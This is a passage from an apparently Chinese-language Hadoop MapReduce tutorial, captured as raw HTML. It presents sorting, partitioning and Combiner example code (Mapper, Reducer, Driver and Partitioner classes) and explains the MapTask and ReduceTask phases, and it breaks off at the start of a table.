punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Mapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlowCountSortMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>LongWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> FlowBean<span class="token punctuation">,</span> Text<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    FlowBean bean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FlowBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Text v <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">map</span><span class="token punctuation">(</span>LongWritable key<span class="token punctuation">,</span> Text value<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取一行</span>        String line <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 截取</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 封装对象</span>        String phoneNbr <span class="token operator">=</span> fields<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> upFlow <span class="token operator">=</span> Long<span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span>fields<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> downFlow <span class="token operator">=</span> Long<span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span>fields<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bean<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>upFlow<span class="token punctuation">,</span> downFlow<span class="token punctuation">)</span><span class="token punctuation">;</span>        v<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>phoneNbr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 输出</span>        context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）编写Reducer类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>sort<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Reducer<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlowCountSortReducer</span> <span class="token keyword">extends</span> <span class="token class-name">Reducer</span><span class="token operator">&lt;</span>FlowBean<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> FlowBean<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">reduce</span><span class="token punctuation">(</span>FlowBean key<span class="token punctuation">,</span> Iterable<span class="token operator">&lt;</span>Text<span class="token operator">></span> values<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 循环输出，避免总流量相同情况</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Text text <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）编写Driver类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>sort<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Job<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>FileInputFormat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlowCountSortDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 输入输出路径需要根据自己电脑上实际的输入输出路径设置</span>        args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"e:/output1"</span><span class="token punctuation">,</span><span class="token string">"e:/output2"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取配置信息，或者job对象实例</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 指定本程序的jar包所在的本地路径</span>        job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>FlowCountSortDriver<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 指定本业务job要使用的mapper/Reducer业务类</span>        job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>FlowCountSortMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>FlowCountSortReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 指定mapper输出数据的kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>FlowBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 5 指定最终输出的数据的kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>FlowBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 6 指定job的输入原始文件所在目录</span>        FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 7 将job中配置的相关参数，以及job所用的java类所在的jar包， 提交给yarn去运行</span>        <span class="token keyword">boolean</span> result <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>result <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-6-WritableComparable排序案例实操（区内排序）"><a href="#3-6-WritableComparable排序案例实操（区内排序）" class="headerlink" title="3.6 WritableComparable排序案例实操（区内排序）"></a>3.6 WritableComparable排序案例实操（区内排序）</h2><p>1）需求<br>要求每个省份手机号输出的文件中按照总流量内部排序。<br>2）需求分析<br>    基于前一个需求，增加自定义分区类，分区按照省份手机号设置。</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638354490441.png" alt="1638354490441"></p><p>3）案例实操<br>（1）增加自定义分区类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>sort<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Partitioner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProvincePartitioner</span> <span class="token keyword">extends</span> <span class="token class-name">Partitioner</span><span class="token operator">&lt;</span>FlowBean<span class="token punctuation">,</span> Text<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getPartition</span><span class="token punctuation">(</span>FlowBean key<span class="token punctuation">,</span> Text value<span class="token punctuation">,</span> <span class="token keyword">int</span> numPartitions<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取手机号码前三位</span>        String preNum <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> partition <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 根据手机号归属地设置分区</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"136"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"137"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"138"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"139"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>preNum<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> partition<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）在驱动类中添加分区类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 加载自定义分区类</span>job<span class="token punctuation">.</span><span class="token function">setPartitionerClass</span><span class="token punctuation">(</span>ProvincePartitioner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置Reducetask个数</span>job<span class="token punctuation">.</span><span class="token function">setNumReduceTasks</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-7-Combiner合并"><a href="#3-7-Combiner合并" class="headerlink" title="3.7 Combiner合并"></a>3.7 Combiner合并</h2><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638354530636.png" alt="1638354530636"></p><p><strong>自定义Combiner实现步骤:</strong><br>（a）自定义一个Combiner继承Reducer，重写Reduce方法</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountCombiner</span> <span class="token keyword">extends</span> <span class="token class-name">Reducer</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> IntWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span>IntWritable<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">reduce</span><span class="token punctuation">(</span>Text key<span class="token punctuation">,</span> Iterable<span class="token operator">&lt;</span>IntWritable<span class="token operator">></span> values<span class="token punctuation">,</span>Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 汇总操作</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>IntWritable v <span class="token operator">:</span>values<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            count <span class="token operator">+=</span> v<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 写出</span>        context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IntWritable</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（b）在Job驱动类中设置：</p><pre class="line-numbers language-java"><code class="language-java">job<span class="token punctuation">.</span><span class="token function">setCombinerClass</span><span class="token punctuation">(</span>WordcountCombiner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-8-Combiner合并案例实操"><a href="#3-8-Combiner合并案例实操" class="headerlink" title="3.8 Combiner合并案例实操"></a>3.8 Combiner合并案例实操</h2><p>1）需求<br>统计过程中对每一个MapTask的输出进行局部汇总，以减小网络传输量即采用Combiner功能。<br>（1）数据输入</p><p>（2）期望输出数据<br>期望：Combine输入数据多，输出时经过合并，输出数据降低。<br>2）需求分析</p><p>对每一个MapTask的输出进行局部汇总</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638354559335.png" alt="1638354559335"></p><p>3）案例实操-方案一<br>（1）增加一个WordcountCombiner类继承Reducer</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>mr<span class="token punctuation">.</span>combiner<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IntWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Reducer<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountCombiner</span> <span class="token keyword">extends</span> <span class="token class-name">Reducer</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> IntWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> IntWritable<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>IntWritable v <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntWritable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">reduce</span><span class="token punctuation">(</span>Text key<span class="token punctuation">,</span> Iterable<span class="token operator">&lt;</span>IntWritable<span class="token operator">></span> values<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 汇总</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>IntWritable value <span class="token operator">:</span>values<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            sum <span class="token operator">+=</span> value<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        v<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 写出</span>        context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）在WordcountDriver驱动类中指定Combiner<br>// 指定需要使用combiner，以及用哪个类作为combiner的逻辑<br>job.setCombinerClass(WordcountCombiner.class);<br>4）案例实操-方案二<br>（1）将WordcountReducer作为Combiner在WordcountDriver驱动类中指定<br>// 指定需要使用Combiner，以及用哪个类作为Combiner的逻辑<br>job.setCombinerClass(WordcountReducer.class);<br>运行程序，如下图所示</p><p><img src="/2020/11/12/bigdata-mapreduce2-framework/1638354590504.png" alt="1638354590504"></p><h1 id="4-MapTask工作机制"><a href="#4-MapTask工作机制" class="headerlink" title="4 MapTask工作机制"></a>4 MapTask工作机制</h1><p>​                          <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354667388.png" alt="1638354667388">      </p><p>​    （1）Read阶段：MapTask通过InputFormat获得的RecordReader，从输入InputSplit中解析出一个个key/value。</p><p>​    （2）Map阶段：该节点主要是将解析出的key/value交给用户编写map()函数处理，并产生一系列新的key/value。</p><p>​    （3）Collect收集阶段：在用户编写map()函数中，当数据处理完成后，一般会调用OutputCollector.collect()输出结果。在该函数内部，它会将生成的key/value分区（调用Partitioner），并写入一个环形内存缓冲区中。</p><p>​    （4）Spill阶段：即“溢写”，当环形缓冲区满后，MapReduce会将数据写到本地磁盘上，生成一个临时文件。需要注意的是，将数据写入本地磁盘之前，先要对数据进行一次本地排序，并在必要时对数据进行合并、压缩等操作。</p><p>​    <strong>溢写阶段详情：</strong></p><p>​    步骤1：利用快速排序算法对缓存区内的数据进行排序，排序方式是，先按照分区编号Partition进行排序，然后按照key进行排序。这样，经过排序后，数据以分区为单位聚集在一起，且同一分区内所有数据按照key有序。</p><p>​    步骤2：按照分区编号由小到大依次将每个分区中的数据写入任务工作目录下的临时文件output/spillN.out（N表示当前溢写次数）中。如果用户设置了Combiner，则写入文件之前，对每个分区中的数据进行一次聚集操作。</p><p>​    步骤3：将分区数据的元信息写到内存索引数据结构SpillRecord中，其中每个分区的元信息包括在临时文件中的偏移量、压缩前数据大小和压缩后数据大小。如果当前内存索引大小超过1MB，则将内存索引写到文件output/spillN.out.index中。</p><p>​    （5）Merge阶段：当所有数据处理完成后，MapTask对所有临时文件进行一次合并，以确保最终只会生成一个数据文件。</p><p>​    当所有数据处理完后，MapTask会将所有临时文件合并成一个大文件，并保存到文件output/file.out中，同时生成相应的索引文件output/file.out.index。</p><p>​    在进行文件合并过程中，MapTask以分区为单位进行合并。对于某个分区，它将采用多轮递归合并的方式。每轮合并mapreduce.task.io.sort.factor（默认10）个文件，并将产生的文件重新加入待合并列表中，对文件排序后，重复以上过程，直到最终得到一个大文件。</p><p>​    让每个MapTask最终只生成一个数据文件，可避免同时打开大量文件和同时读取大量小文件产生的随机读取带来的开销。</p><h1 id="5-ReduceTask工作机制"><a href="#5-ReduceTask工作机制" class="headerlink" title="5 ReduceTask工作机制"></a>5 ReduceTask工作机制</h1><p>   <img src="/2020/11/12/bigdata-mapreduce2-framework/1638354702967.png" alt="1638354702967"></p><p>​    （1）Copy阶段：ReduceTask从各个MapTask上远程拷贝一片数据，并针对某一片数据，如果其大小超过一定阈值，则写到磁盘上，否则直接放到内存中。</p><p>​    （2）Merge阶段：在远程拷贝数据的同时，ReduceTask启动了两个后台线程对内存和磁盘上的文件进行合并，以防止内存使用过多或磁盘上文件过多。</p><p>​    （3）Sort阶段：按照MapReduce语义，用户编写reduce()函数输入数据是按key进行聚集的一组数据。为了将key相同的数据聚在一起，Hadoop采用了基于排序的策略。由于各个MapTask已经实现对自己的处理结果进行了局部排序，因此，ReduceTask只需对所有数据进行一次归并排序即可。</p><p>​    （4）Reduce阶段：reduce()函数将计算结果写到HDFS上。</p><p>1）设置ReduceTask并行度（个数）</p><p>ReduceTask的并行度同样影响整个Job的执行并发度和执行效率，但与MapTask的并发数由切片数决定不同，ReduceTask数量的决定是可以直接手动设置：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 默认值是1，手动设置为4</span>job<span class="token punctuation">.</span><span class="token function">setNumReduceTasks</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）实验：测试ReduceTask多少合适</p><p>（1）实验环境：1个Master节点，16个Slave节点：CPU:8GHZ，内存: 2G</p><p>（2）实验结论：</p><p>表 改变ReduceTask （数据量为1GB）</p><table><thead><tr><th>MapTask 